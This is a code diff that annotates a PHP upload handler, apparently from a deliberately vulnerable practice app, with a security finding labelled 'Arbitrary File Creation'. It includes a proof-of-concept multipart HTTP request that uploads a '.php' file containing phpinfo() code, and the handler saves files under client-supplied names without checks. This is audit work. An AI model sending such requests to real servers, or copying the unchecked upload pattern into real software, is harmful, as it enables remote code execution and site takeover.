@@ -29,6 +29,26 @@
 			<?php
 				if(isset($_POST['upload'])) {
 					$destination = 'uploads/' . $_FILES['userfile']['name'];
+					// TODO: AI issue #8, High, Arbitrary File Creation, https://github.com/rbm1718/bricks/issues/8
+					//
+					// POST /upload-1/index.php HTTP/1.1
+					// Host: localhost
+					// Accept-Encoding: identity
+					// Connection: close
+					// Content-Length: 292
+					// Content-Type: multipart/form-data; boundary=eb9ec68d7b7f4f0aa0c438d7cdd7f125
+					//
+					// --eb9ec68d7b7f4f0aa0c438d7cdd7f125
+					// Content-Disposition: form-data; name="upload"
+					//
+					// 935137890000
+					// --eb9ec68d7b7f4f0aa0c438d7cdd7f125
+					// Content-Disposition: form-data; name="userfile"; filename=".php"
+					// Content-Type: application/octet-stream
+					//
+					// <?php phpinfo(); ?>
+					// --eb9ec68d7b7f4f0aa0c438d7cdd7f125--
+					//
 					if (move_uploaded_file($_FILES['userfile']['tmp_name'], $destination)) {
 						echo "<div class=\"alert-box success\">Upload succesful: <a href='$destination'>here</a><a href=\"\" class=\"close\">&times;</a></div>";
 						}
